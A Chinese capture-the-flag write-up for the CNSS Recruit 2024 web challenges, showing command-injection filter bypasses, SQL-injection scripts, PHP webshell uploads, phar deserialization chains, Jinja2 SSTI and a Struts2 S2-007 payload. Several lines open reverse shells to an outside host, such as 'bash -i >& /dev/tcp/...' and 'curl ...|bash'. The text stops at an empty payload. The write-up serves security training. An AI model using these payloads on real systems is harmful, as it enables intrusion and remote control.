# CNSS Recruit 2024 Web方向 题解WriteUp

文章首发于【先知社区】：https://xz.aliyun.com/t/15586

## babyHTTP



![image-20240807211545505](https://img-blog.csdnimg.cn/img_convert/1056f4326c2f4107fc4068e4faf1363e.png)

开题，Http传参问题



![image-20240807211610189](https://img-blog.csdnimg.cn/img_convert/b65b606056f67cf40778fdb82f37d222.png)

```has-numbering
GET：
?CNSS=hackers

```



![image-20240807211653991](https://img-blog.csdnimg.cn/img_convert/9c090f23e150ddb822c8f8e7fc4b9d24.png)

```has-numbering
POST：
web=fun

```



![image-20240807211708799](https://img-blog.csdnimg.cn/img_convert/29b8cf482cddb98fc8d7140ab48d5808.png)

```has-numbering
Cookie：
admin=true

```



![image-20240807211742583](https://img-blog.csdnimg.cn/img_convert/d2c823f7ace509a310f6552560f0953f.png)

## PHPinfo



![image-20240807211812833](https://img-blog.csdnimg.cn/img_convert/fcda77a41dffb1a7b1ed4394c161ad4b.png)

开题



![image-20240807211834499](https://img-blog.csdnimg.cn/img_convert/d370a9da93ab7e85fc8ea4a04e0caf05.png)

根据题目描述，猜测phpinfo.php文件有东西。

phpinfo里面包含了php环境绝大部分信息，当然也有flag



![image-20240807211906991](https://img-blog.csdnimg.cn/img_convert/7465ac2f00703a3788485a726eb67217.png)

## 我得再快点



![image-20240807213557132](https://img-blog.csdnimg.cn/img_convert/23ebc92e3fa5ba3f4871be713b978f20.png)

开题，一秒一遍，写自动化脚本吧



![image-20240807213828675](https://img-blog.csdnimg.cn/img_convert/1a198dcbb1c3a796b019612f4a4ffc8c.png)

脚本思路：

获取key，md5加密，发送到/check?value=

```prism
from selenium import webdriver
from selenium.webdriver.common.by import By
import hashlib
import requests
import time

# 定义要请求的URL
url = 'http://152.136.11.155:10103/'
url_check = 'http://152.136.11.155:10103/check'

# 定义定时刷新的时间间隔（以秒为单位）
refresh_interval = 1  # 1秒


def get_key():
    try:
        driver.get(url)
        time.sleep(1)  # 等待页面加载
        key_element = driver.find_element(By.XPATH, "//p[contains(text(),'Key :')]")
        key_text = key_element.text
        key = key_text.split('Key : ')[1]
        return key
    except Exception as e:
        print(f"Failed to fetch key from page: {e}")
        return None


def md5_encrypt(key):
    md5_hash = hashlib.md5()
    md5_hash.update(key.encode('utf-8'))
    return md5_hash.hexdigest()


def send_encrypted_key(encrypted_key):
    try:
        response = requests.get(url_check, params={'value': encrypted_key})
        response.raise_for_status()
        print(f"Response from /check: {response.text}")
    except requests.RequestException as e:
        print(f"Failed to send encrypted key: {e}")


if __name__ == "__main__":
    driver = webdriver.Chrome()
    try:
        while True:
            key = get_key()
            print(key)
            if key:
                encrypted_key = md5_encrypt(key)
                send_encrypted_key(encrypted_key)
            time.sleep(refresh_interval)
    finally:
        driver.quit()


```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)



![image-20240807215255524](https://img-blog.csdnimg.cn/img_convert/5743fd77b6d6d488684b7737baff0c2f.png)

## Ping



![image-20240807215447580](https://img-blog.csdnimg.cn/img_convert/16ec80a1a58858b20beee4684efe0181.png)

开题，是自动ping一个ip然后返回结果



![image-20240807215922103](https://img-blog.csdnimg.cn/img_convert/909205fd5008cdcd9c8e700ceda2baf1.png)

nl2br是一个格式整理函数，在字符串中的新行（\n）之前插入换行符



![image-20240807222204337](https://img-blog.csdnimg.cn/img_convert/b95b872c35faf297fd94693d056efdeb.png)

这个ping函数查不到，应该是自定义函数。这题感觉猜测是在函数内部执行了ping命令，应该是用分隔符去截断做。

分隔符被过滤了|、;、&还能用%0a

```has-numbering
ip=127.0.0.1%0als

```



![image-20240807222148768](https://img-blog.csdnimg.cn/img_convert/b9990b04f4ef60e17e97000a55d0addd.png)

控股也被过滤了，用%09也就是tab绕过，读一下源码

```has-numbering
ip=127.0.0.1%0acat%09index.php

```

```prism
<?php
function validate_input($input) {
    $invalid_chars = array("sh","bash","chown"," ", "chmod", "echo", "+", "&",";", "|", ">", "<", "`", "\\", "\"", "'", "(", ")", "{", "}", "[", "]");
    foreach ($invalid_chars as $invalid_char) {
        if (strpos($input, $invalid_char) !== false) {
            return false;
        }
    }

    if (preg_match("/.*f.*l.*a.*g.*/", $input)) {
        return false;
    }

    return true;
}

function ping($ip_address) {
    if (!validate_input($ip_address)) {
        return "Error: Invalid input.";
    }

    $cmd = "ping -c 2 " .$ip_address;
    exec($cmd, $output, $return_code);


    if ($return_code !== 0) {
        echo("Error: Failed to execute command.");
    }

    return implode("\n", $output);
}

if (isset($_POST['ip'])) {
    $ip = $_POST['ip'];
    $ping_result = ping($ip);
    echo nl2br($ping_result); // 输出ping结果并保留换行
}
?>

```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

payload：

```has-numbering
ip=127.0.0.1%0acat%09/f*

```



![image-20240807222306986](https://img-blog.csdnimg.cn/img_convert/99f547dd5bfc0a88e790512689f05357.png)

linux常用命令合集：

```has-numbering
ls   ##查看目录
ls /  ##列出根目录(\)下的所有目录：
echo `tac% fla*`;   ##反字节符
cp fl*g.php a.txt   ##将flag.php拷贝到a.txt
cd ..或者cd ../   ##达到访问上一个目录的目的##../和~/是目录跳转符
tac   ##tac flag 反序输出文件内容
cat   ##
tac /flag   ##抓在根目录的flag
find / -name fla*   ##找到文件名匹配fla*的文件
tac/cat $(find / -name fla*)   ##打印所有文件名匹配fla*的文件
find /html/WWW/ -name fla*  ：在某目录下查找包含fla*的文件
find / -type f -exec grep -Hn "flag{" {} \;
dir /   查看根目录
find / -user root -perm -4000 -print 2>/dev/null   #查看suid权限文件
---------------------------------------------------------------------
mv fl?g.php 1.txt   ##将flag.php改名为1.txt
cp fla?.??? 1.txt      ##将flag.php复制给1.txt
nl flag.php>x.txt
tee file1.txt file2.txt //复制文件
tac /f149_15_h3r3|tee 2

awk '/xxx/' fla?.php   ##输出flag文件中包含字符xxx的行
awk '/xxx/{print}' fla?.php  ##输出flag文件中包含字符xxx的行

?c=grep 'ctfshow' flag.php
（在 fl???php匹配到的文件中，查找含有ctfshow的文件，并打印出包含 ctfshow 的这一行）

cat `ls`    ##直接将当前目录下所有文件打印出来,先执行反引号
#cat `ls`->cat 当前所有文件名->当前目录下所有文件打印出来

system("cat flag.php|base64") //把flagbase64编码后输出system("base64 flag.php") //把flagbase64编码后输出
--------------------------------------------------------------------
在linux中与cat有类似功能的有如下字符
cat、tac、more、less、head、tail、nl、sed、sort、uniq、rev、awk
more:一页一页的显示档案内容    more flag.php
less:与 more 类似   less flag.php
head:查看头几行  head flag.php
tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示
tail:查看尾几行  tail flag.php
nl：显示的时候，顺便输出行号  nl flag.php   
od:以二进制的方式读取档案内容  od flag.php
vi:一种编辑器，这个也可以查看
vim:一种编辑器，这个也可以查看
sort:可以查看     sort flag.php
uniq:可以查看
file -f:报错出具体内容
rev：将文件倒序输出。
strings：strings flag.php

grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings
-----------------------------------------------------------------------

```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

## CNSS娘の宠物商店



![image-20240807205258624](https://img-blog.csdnimg.cn/img_convert/26474da65c09733a866e244754cfd06e.png)

开题，需要登录。（前端好看



![image-20240807205447973](https://img-blog.csdnimg.cn/img_convert/385282e1accf30433a4826503b87671a.png)

模糊字典测一下，发现登录处存在sql注入。



![image-20240807205428813](https://img-blog.csdnimg.cn/img_convert/f3624fc7a469a5dd4d61a3d93637c897.png)

结合题目描述猜测是用万能密码进行登录。



![image-20240807205410810](https://img-blog.csdnimg.cn/img_convert/819373d3ae4a43d4aba7bb923cc65263.png)



![image-20240807205401421](https://img-blog.csdnimg.cn/img_convert/cb623cf13e9bcdce2131bb60649413d4.png)

## 2048



![image-20240807222608925](https://img-blog.csdnimg.cn/img_convert/80a272d0384612a99fc5c599251bf44e.png)

一眼前端游戏题



![image-20240808111207939](https://img-blog.csdnimg.cn/img_convert/35f60143d312ff6b26bd8d6f38e50087.png)

ban了 F12、Ctrl+U。鼠标表点击谷歌开发者工具就行。

源代码里面搜索alert、score、flag、cnss。有score也就是记录分数的变量。

开启一局游戏，随便玩几下



![image-20240808111547682](https://img-blog.csdnimg.cn/img_convert/8e444c8474376b5f3c5ed80c8f0c8e3a.png)

然后控制台输入score=9999999999999999999999修改分数



![image-20240808111611679](https://img-blog.csdnimg.cn/img_convert/42e6acc5755ede79f8d246dbcfd4e05e.png)

点击flag拿flag。



![image-20240808111517363](https://img-blog.csdnimg.cn/img_convert/bed6154da1adfa57c66c5421d824f3ef.png)

看得出来flag是alert出来的，源码看看flag如何出来的

有一个getflag函数，进行了加密（混淆）



![image-20240808111851353](https://img-blog.csdnimg.cn/img_convert/e9902366cbee473ed003c50d92905cc9.png)

## 换个头像先



![image-20240808112821547](https://img-blog.csdnimg.cn/img_convert/94b21290ddbb86ab54e73601790be0b9.png)

应该是个文件上传。开题需要登录



![image-20240808112847578](https://img-blog.csdnimg.cn/img_convert/73b5b98572f0e5db94a0008f5a0bb442.png)

注册个账号然后登录



![image-20240808112927882](https://img-blog.csdnimg.cn/img_convert/a9582aef8ad0dc351af0278fc74e1759.png)

更换头像，抓包。前端限制了后缀，上传个jpg后缀的php木马上去



![image-20240808113037984](https://img-blog.csdnimg.cn/img_convert/f4e09aee6d6d7c7e12803b61a66ba399.png)

改成php后缀



![image-20240808113205624](https://img-blog.csdnimg.cn/img_convert/d823c8b35f08ec2eef87d442eee3f8b2.png)

没给上传到哪的路径，不急，Ctrl+U前端源码看看

点击访问



![image-20240808113237085](https://img-blog.csdnimg.cn/img_convert/26f1ad1de5929cce5c4dfcfc1aec91a1.png)

已经tac到了flag



![image-20240808113304310](https://img-blog.csdnimg.cn/img_convert/0a7264f071ed392e51f1ebd723692d51.png)

## can can need shell



![image-20240808113343392](https://img-blog.csdnimg.cn/img_convert/aec10ff38dcc5a96a5de312eb1073fd9.png)

开题，直接给了源码



![image-20240808144350780](https://img-blog.csdnimg.cn/img_convert/fb83ef25449612e964e8c8d27f133d20.png)

是个文件上传，后缀和内容均有过滤。题目没有上传按钮，应该是我自己写一个html表单上传，注意name="uploaded_file"

```prism
<form action="http://152.136.11.155:10108/" enctype="multipart/form-data" method="post" >
    
    <input name="uploaded_file" type="file" />
    <input type="submit" type="gogogo!" />
   
</form>

```

抓个包慢慢调，后缀是php确定了，其他后缀不解析，看看内容怎么绕过滤

内容过滤是这些：

```has-numbering
$dangerous = array('eval',"[","]","`","*","+","|","url","flag","{","}","@","(",")");

```

呜，过滤了括号我很难做阿，难做那就别做了（bushi

首要思路是找个可以不用括号的函数，看下图你应该懂我意思了吧



![image-20240808151650246](https://img-blog.csdnimg.cn/img_convert/0ef3c45c48b2e645c9368bfe5427c812.png)

include不用括号也行，同时只包含内容不管后缀即文件种类

那我们上传一个带马的jpg。



![image-20240808151912279](https://img-blog.csdnimg.cn/img_convert/7e52ff61689ade2cebcb37edf9c6628f.png)

```has-numbering
------WebKitFormBoundary6ofY3JQEOAOo4nWV
Content-Disposition: form-data; name="uploaded_file"; filename="myshell.jpg"
Content-Type: application/octet-stream

<?php eval($_POST[1]);echo 'include success!!!'?>
------WebKitFormBoundary6ofY3JQEOAOo4nWV--

```

然后上传一个php去包含之前的jpg



![image-20240808152049757](https://img-blog.csdnimg.cn/img_convert/8c7cea761025c5c1444dddf6370d465a.png)

```has-numbering
------WebKitFormBoundary6ofY3JQEOAOo4nWV
Content-Disposition: form-data; name="uploaded_file"; filename="myshell.php"
Content-Type: application/octet-stream

<?php
include '../a3a3ba08c46190b5eb693450637552d5/c8f8f62b73b118b60546893b80b08a48.jpg';
echo 'this is include';
?>
------WebKitFormBoundary6ofY3JQEOAOo4nWV--

```

访问一下，从echo来看包含成功了，getshell就行



![image-20240808152137864](https://img-blog.csdnimg.cn/img_convert/1d5a095ec4f529c0eab8cf97aa4a1103.png)



![image-20240808152201472](https://img-blog.csdnimg.cn/img_convert/6dd4f704502ce14707a4bc3b01918cb0.png)

此外还有一个payload，上传一个文件就行：

```has-numbering
<?php 
include"php://filter/convert.base64-encode/resource=/fl"."ag";

```

## EZRCCCCE



![image-20240808152956216](https://img-blog.csdnimg.cn/img_convert/5ee1ef4389eaf8b22c510d5535e494a3.png)

开题，直接给了源码



![image-20240808153107728](https://img-blog.csdnimg.cn/img_convert/93e7d6c3c34644d5e15f77c88383e7a4.png)

```prism
<?php
highlight_file(__FILE__);
$sandbox = './sandbox/' . md5("Th1s_is_4_sandbox" . $_SERVER['REMOTE_ADDR']);
@mkdir($sandbox);
@chdir($sandbox);
function filter($a){
    $a = preg_replace("/(flag|\*|\/|cat|php|bash|txt|tac)/i", "hehehehe", $a);
    return $a;}
if (isset($_GET['6']) && strlen($_GET['6']) < 8) {   //try to keep fit!
    echo(exec(filter($_GET['6'])));
}
?>

```

限制了输入的长度、具备少量WAF。

WAF绕过不难，最容易想到的就是同义替换或者base64

主要是思考如何突破长度限制

在linux中，当我们执行文件中的命令的时候，我们通过在没有写完的命令后面加 \，可以将一条命令写在多行 比如我们有一个test文件内容如下：

```has-numbering
ec\
ho \
hello \
world!

```

然后我们用sh命令来执行一下，成功输出了 hello world

```has-numbering
sh test

```

在linux中，我们使用ls -t命令后，可以将文件名按照时间顺序排列出来（后创建的排在前面）

```has-numbering
touch a
touch b
touch c
ls -t

```



![image-20240907045305157](https://img-blog.csdnimg.cn/img_convert/1c043a6d522d4dcdc59234477b9602bd.png)

ls -t 命令列出文件名，然后每个文件名按行储存，如果我们将我们要执行的命令拆分为多个文件名，然后再结合命令换行，然后通过 ls -t > test这样的方式再写入某个文件来运行不就可以绕过命令长度限制了吗，而且从上面我们可以看出，ls -t>test的执行顺序是先创建文件test，然后执行ls -t，然后将执行结果写入test文件

```has-numbering
ls -t>test
cat test

```



![image-20240907045419600](https://img-blog.csdnimg.cn/img_convert/48be23d6ca21f8fb92dfa93f641cb5c8.png)

```has-numbering
> "rld"
> "wo\\"
> "llo \\"
> "he\\"
> "echo \\"
ls -t > _
sh _

```



![image-20240907045635769](https://img-blog.csdnimg.cn/img_convert/ba776b2865b5986c0f42d6836ac05590.png)

这里使用了两个 \ 是因为我们需要转义掉多行命令的换行，如果我们只使用一个 \ 那么就会被误解为正在多行执行命令，就会出现下面这种情况：



![image-20240907045835984](https://img-blog.csdnimg.cn/img_convert/b59f777626b2ed513a07f26245e05099.png)

输入通配符* ，Linux会把第一个列出的文件名当作命令，剩下的文件名当作参数

```has-numbering
>id 
>root
*

```



![image-20240907052348379](https://img-blog.csdnimg.cn/img_convert/177a297661cf6ee557ac127bcabda888.png)

讲清楚原理后开始做题。

pwd查看当前可写入的目录



![image-20240907083223831](https://img-blog.csdnimg.cn/img_convert/6b794580e537d8a8cfafde2f449bd9a8.png)

```has-numbering
#写入语句
<?php eval($_GET[1]);

#base64编码后
PD9waHAgZXZhbCgkX0dFVFsxXSk7

#需要被执行的语句：
echo PD9waHAgZXZhbCgkX0dFVFsxXSk7|base64 -d>1.php

```

依次输入：

```has-numbering
>hp
>1.p\\
>d\>\\
>\ -\\
>e64\\
>bas\\
>7\|\\
>XSk\\
>Fsx\\
>dFV\\
>kX0\\
>bCg\\
>XZh\\
>AgZ\\
>waH\\
>PD9\\
>o\ \\
>ech\\
ls -t>0
nl 0
sh 0

```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

或者：

```has-numbering
>dir
>f\>
>ht-
>sl
*>v
>rev
*v>0
>a
>hp
>p\\
>1.\\
>\>\\
>-d\\
>\ \\
>64\\
>se\\
>ba\\
>\|\\
>7\\
>Sk\\
>X\\
>x\\
>Fs\\
>FV\\
>d\\
>X0\\
>k\\
>g\\
>bC\\
>h\\
>XZ\\
>gZ\\
>A\\
>aH\\
>w\\
>D9\\
>P\\
>S}\\
>IF\\
>{\\
>\$\\
>o\\
>ch\\
>e\\
sh 0
sh f            

```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

脚本：

```prism
import requests

url = "http://152.136.11.155:10109/?6={0}"
cookies = {"PHPSESSID": "1be0406b25e76622ec8aece860d13e82"}  # 添加PHPSESSID cookie

print("[+] Start attack!!!")
with open("results.txt", "r") as f:
    for i in f:
        print("[*] " + url.format(i.strip()))
        requests.get(url.format(i.strip()), cookies=cookies)  # 传入cookies

# 检查是否攻击成功
test = requests.get("http://152.136.11.155:10109/sandbox/85323d93cc57664e7b283ecce923a707/1.php", cookies=cookies)  # 传入cookies
if test.status_code == requests.codes.ok:
    print("[*] Attack success!!!")


```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)



![image-20240907083428462](https://img-blog.csdnimg.cn/img_convert/adc156ff3e99f7b8bb5c0293cac1307f.png)

访问/sandbox/85323d93cc57664e7b283ecce923a707/1.php?1=system('ls /');getshell



![image-20240907083658945](https://img-blog.csdnimg.cn/img_convert/d3658b80632baca317652a3281327885.png)

结尾再放一下其他的payload：

空格需要转义

```prism
>\ \\

```

构造空格就用去了五个字符，反弹shell语句里面有两个空格，而相同的文件名只能有一个，因此这里不能直接执行bash反弹shell 那么通过将反弹语句放在vps上，然后通过如下方式来执行：

```prism
curl ip地址|bash

```

我们先在自己的vps新建一个文件，内容为

```prism
bash -i >& /dev/tcp/124.71.147.99/1717 0>&1

```

因为ls -t>_的长度也大于5，所以要要把ls -t>y写入文件

ls命令排序的规则是空格和符号最前，数字其次，字母最后

参考以下脚本写法：

```prism
#encoding:utf-8
import requests
baseurl = "http://120.79.33.253:9003/?cmd="

s = requests.session()

# 将ls -t 写入文件_
list=[
    ">ls\\",
    "ls>_",
    ">\ \\",
    ">-t\\",
    ">\>y",
    "ls>>_"
]
# curl 120.79.33.253|bash
list2=[
    ">bash",
    ">\|\\",
    ">53\\",
    ">2\\",
    ">3.\\",
    ">3\\",
    ">9.\\",
    ">7\\",
    ">0.\\",
    ">12\\",
    ">\ \\",
    ">rl\\",
    ">cu\\"
]
for i in list:
    url = baseurl+str(i)
    s.get(url)
for j in list2:
    url = baseurl+str(j)
    s.get(url)
s.get(baseurl+"sh _")
s.get(baseurl+"sh y")



```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

## Tomcat?cat~



![image-20240808163119493](https://img-blog.csdnimg.cn/img_convert/489f2eb96470a95170e683ae136f816c.png)

估计是java题，开题



![image-20240808163725093](https://img-blog.csdnimg.cn/img_convert/18f8b06996a1ee8b3e85064a447b713f.png)

源码发现是struts2的漏洞



![image-20240808163735927](https://img-blog.csdnimg.cn/img_convert/1a583f8b74c2ac692691739f14c0f378.png)

结合登录框特征，应该是S2-007，在age处注入Payload

```has-numbering
/user.action
POST:
name=&email=&age=%27+%2B+%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew+java.lang.Boolean%28%22false%22%29+%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%27bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMjQuNzEuMTQ3Ljk5LzE3MTcgMD4mMQ%3D%3D%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D%27%29.getInputStream%28%29%29%29+%2B+%27

```



![image-20240808170218583](https://img-blog.csdnimg.cn/img_convert/94c020f7468f881547de71648ee80d92.png)

flag在/usr/local/tomcat/webapps/flaaaaaaag/flag.jsp



![image-20240808183610511](https://img-blog.csdnimg.cn/img_convert/29c2a0be459d4c2f70fc9d6d264df87d.png)

## newsql



![image-20240807211514411](https://img-blog.csdnimg.cn/img_convert/381a019d842c9338717ed4e364736f19.png)

开题，id应该是注入点了



![image-20240808205920451](https://img-blog.csdnimg.cn/img_convert/da5e72e261902508c1d20638c16109b9.png)

存在过滤



![image-20240808210016736](https://img-blog.csdnimg.cn/img_convert/08aa7892be36c51be31985a28d5debba.png)

模糊测试测一下，响应大小为7的都是被过滤的



![image-20240808210230581](https://img-blog.csdnimg.cn/img_convert/8356401b194fd3327aaa53be335c55c7.png)

过滤如下

```has-numbering
;
select
union
where
order
having

```

闭合为空，数字型

```has-numbering
/?id=1 and 1=1--+
/?id=1 and 1=2--+

```



![image-20240808214146728](https://img-blog.csdnimg.cn/img_convert/a26f7fb2801e5fff5e48012e463ed45d.png)



![image-20240808214157558](https://img-blog.csdnimg.cn/img_convert/65b54f16b447abd435cb77d0e5acaddb.png)

MYSQL8.0新特性注入

Pwnhub2021七月赛NewSql（mysql8注入）_mysql8.0新特性注入ctf-CSDN博客

MYSQL8.0注入新特性 - 先知社区 (aliyun.com)

【网安干货】MySQL8新特性注入技巧_mysql8.0.19还是8.0.21-CSDN博客

先手动盲注一下，可行

```has-numbering
?id=1 and substr((database()),1,4)='cnss'
?id=1 and ((binary'mysqk','')<(table/**/information_schema.TABLESPACES_EXTENSIONS/**/limit/**/0,1))#

```



![image-20240907085937841](https://img-blog.csdnimg.cn/img_convert/75710b3041378af02cc896d2e5e84f19.png)



![image-20240907091129254](https://img-blog.csdnimg.cn/img_convert/3a8559ed80e6a960ccd8c03ca773660c.png)

写个自动化脚本：（没写完）

```has-numbering
import requests

url="http://152.136.11.155:10111"

flag=""
for i in range(100):
    for j in "!#$%&()*+,-/0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~":
        # payload = "1 and ((binary'{}','')<(table information_schema.TABLESPACES_EXTENSIONS limit 7,1))#".format(flag+j)

        payload = "1 and (('def','cnss','{}',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)<(table information_schema.tables limit 8,1))#".format(flag+j)
        # payload = "1 and if(('def','cnss','{}',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)<(TABLE information_schema.tables limit {},1),0,1)"
        # payload = "1 and ('def','cnss','cn55','{}',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0)<(TABLE cn55 limit {},1)".format(flag+j,i)

        # payload = "1 and (('1',binary'{}')<(table cnss.cn55 limit 0,1))#".format(flag+j)



        data={
            'id':payload
        }
        # r = requests.post(url=url, data=data)
        r = requests.get(url=url, params=data)

        # print(payload)
        # print(flag+j)
        # print(len(r.text))
        # print(r.text)

        if len(r.text) == 102:
            flag += chr(ord(j)-1)
            print(flag)
            break
        if j == "~":
            flag = flag[:len(flag)-1]+chr(ord(flag[-1])+1)
            print(flag)
            exit()


#库/表：mysql,innodb_system,innodb_temporary,innodb_undo_001,innodb_undo_002,sys/sys_config,cnss/users,cnss/cn55,cnss/uagents,cnss/referers

```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

## where is my unserialize?



![image-20240808215257471](https://img-blog.csdnimg.cn/img_convert/c947ec9544e4e48e3269fa46b15ae2c2.png)

开题，三个功能点：



![image-20240904124915167](https://img-blog.csdnimg.cn/img_convert/963d9ae2304d27ce4a66fe023e22ae7f.png)

文件读取



![image-20240904124935451](https://img-blog.csdnimg.cn/img_convert/7c055ca80a20108b9e47ce0bbfc09e49.png)

文件上传



![image-20240904124928895](https://img-blog.csdnimg.cn/img_convert/50e779c89e52d385e980be766f995dc7.png)

可读取文件：

index.php

base.php

function.php

class.php

upload_file.php

file.php

upload_file.php有文件上传，file.php可以文件读取，class.php有恶意类。

phar反序列化包包的。

class.php

```prism
<?php
class CNSS
{
    public $shino;
    public $shin0;
    public $name;
    public function __construct($name)
    {
        $this->name=$name;
    }

    public function __wakeup()
    {
        $this->shin0 = 'cnss';
        $this->_sayhello();
    }
    public function _sayhello()
    {
        echo ('<h1>I know you are in a hurry, but don not rush yet.<h1>');
    }


    public function __destruct()
    {
        $this->shin0 = $this->name;
        echo $this->shin0.'<br>';
    }
}



class CN55
{
    public $source;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __invoke()
    {
        return $this->_get('key');
    }
    public function _get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}

class Show
{


    public $key;
    public $haha;

    public function __construct($file)
    {
        $this->key = $file;
        echo $this->key.'<br>';
    }
    public function __toString()
    {
        $func = $this->haha['hehe'];
        return $func();
    }
    public function __call($key,$value)
    {
        $this->$key = $value;
    }

    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('<h1>hackerrrrrr!<br>join CNSS~<h1>');
        } else {
            highlight_file($this->source);
        }

    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {   //Do you know 'Php ARchive'?
            echo "hacker~";
            $this->source = "index.php";
        }
    }

}
?>


```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

反序列化链：

```has-numbering
CNSS::__construct($name)->CNSS::__destruct()->Show::->__toString()->CN55::__invoke()->CN55::_get($key)->CN55::file_get($value)

```

生成phar：

```prism
<?php
class CNSS
{
    public $shino;
    public $shin0;
    public $name;
    public function __construct($name)
    {
        $this->name=$name;
    }

    public function __wakeup()
    {
        $this->shin0 = 'cnss';
        $this->_sayhello();
    }
    public function _sayhello()
    {
        echo ('<h1>I know you are in a hurry, but don not rush yet.<h1>');
    }


    public function __destruct()
    {
        $this->shin0 = $this->name;
        echo $this->shin0.'<br>';
    }
}





class CN55
{
    public $source;
    public $params;
    public function __construct()
    {
        $this->params = array();
    }
    public function __invoke()
    {
        return $this->_get('key');
    }
    public function _get($key)
    {
        if(isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }
    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}

class Show
{
    public $key;
    public $haha;

    public function __construct($file)
    {
        $this->key = $file;
        echo $this->key.'<br>';
    }
    public function __toString()
    {
        $func = $this->haha['hehe'];
        return $func();
    }

    public function __call($key,$value)
    {
        $this->$key = $value;
    }

    public function _show()
    {
        if(preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i',$this->source)) {
            die('<h1>hackerrrrrr!<br>join CNSS~<h1>');
        } else {
            highlight_file($this->source);
        }

    }
    public function __wakeup()
    {
        if(preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {   //Do you know 'Php ARchive'?
            echo "hacker~";
            $this->source = "index.php";
        }
    }

}


//CNSS::__construct($name)->CNSS::__destruct()->Show::->__toString()->CN55::__invoke()->CN55::_get($key)->CN55::file_get($value)

$Jay17=new Show('j47');
$a=new CNSS($Jay17);
$Jay17->haha['hehe']=new CN55();
$Jay17->haha['hehe']->params['key']='file:///var/www/html/f1ag.php';


//删除原来的phar包，防止重复
//@unlink("xxx.phar");
//后缀名必须为phar
$phar = new Phar("xxx.phar");
$phar->startBuffering();
//设置stub
$phar->setStub("<?php __HALT_COMPILER(); ?>");

//将自定义的meta-data存入manifest
$phar->setMetadata($a);
//添加要压缩的文件,这个文件没有也没关系，走个流程
$phar->addFromString("test.txt", "test");
//签名自动计算
$phar->stopBuffering();
echo "done.";


```

![](https://csdnimg.cn/release/blogv2/dist/pc/img/newCodeMoreBlack.png)

修改后缀后上传



![image-20240904160746420](https://img-blog.csdnimg.cn/img_convert/a90727cb7861ee4ffda8ad6a0266959b.png)



![image-20240904160805540](https://img-blog.csdnimg.cn/img_convert/e5b2c1e198775d7e6d38c79d70e74615.png)

翻翻源码看一下上传文件的存储位置。phar协议解析就行。

```has-numbering
/file.php?file=phar:///var/www/html/upload/a976285aa6d6096e9edd17db289a73a9.jpg

```



![image-20240904160849459](https://img-blog.csdnimg.cn/img_convert/df53a8209dd4cf0a956a2c116b5e7f21.png)



![image-20240904160859490](https://img-blog.csdnimg.cn/img_convert/9a361455f2d2d4e8ebe744825320343c.png)

## CNSS娘の聊天室



![image-20240810220046553](https://img-blog.csdnimg.cn/img_convert/1f431691c8a78aae7527c62a7e885960.png)

开题，输入什么输出什么，怀疑是SSTI



![image-20240810220120021](https://img-blog.csdnimg.cn/img_convert/c03f33a5ff99a391358adca416c6eb0d.png)

后端是python，测一下Jinja2



![image-20240810220211444](https://img-blog.csdnimg.cn/img_convert/d9515ac5275a7b893dfb86a8b597f21a.png)

```has-numbering
{{7*7}}

```

还真有



![image-20240810220234856](https://img-blog.csdnimg.cn/img_convert/bc628c0ac125a0c659ec773b0c142b23.png)

试一试最原始的payload。看看是不是上过滤了

```has-numbering
{{''.__class__.__bases__[0].__subclasses__()[166].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

```

发现英文被过滤了。。。只过滤了26个字母，英文符号没事



![image-20240810220500827](https://img-blog.csdnimg.cn/img_convert/64cfcfda51c88830f76df213ef03de15.png)

思路是用八进制代替英文字母，unicode和十六进制都会有英文出现。

原始payload：

```has-numbering
{{''.__class__.__bases__[0].__subclasses__()[133].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

```

转八进制

```has-numbering
.__class__转为['XXXXXX']
[0]不动
()不动
['eval']转为['XXXXXX']
('__import__("os").popen("ls /").read()')转为('XXXXXX')

```

payload:

```has-numbering
